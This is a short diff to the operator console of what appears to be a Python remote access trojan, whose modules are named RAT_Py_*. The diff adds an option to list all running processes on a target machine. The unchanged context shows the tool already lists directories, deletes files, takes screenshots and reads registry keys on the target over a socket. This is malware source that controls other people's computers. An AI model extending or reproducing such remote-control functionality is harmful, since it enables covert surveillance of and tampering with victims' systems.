@@ -10,6 +10,7 @@ from RAT_Py_DirList import *
 from RAT_Py_DeleteFile import *
 from RAT_Py_Screenshot import * 
 from RAT_Py_Registry import *
+from RAT_Py_Process import *
 #from scapy.all import * # switch from socket to scapy for custom TCP packets
 
 SUCCESS = 1
@@ -28,6 +29,7 @@ def printHelp():
                 4) Perform a delete file off target\n
                 5) Take a screenshot of target (will get file and delete file off target)\n
                 6) Read a registry key off target\n
+                7) List all running processes off target\n
                 0) Exit\n""")
     return SUCCESS
 
@@ -145,6 +147,10 @@ def handleInput(ip, port):
             value = bytes(args.value, 'utf-8')
 
             regRead(sock, keyPath, value)
+
+        elif (int(userInput) == PROCESSLIST):
+            printProcessListHelp()
+            processList(sock)
             
     return
 
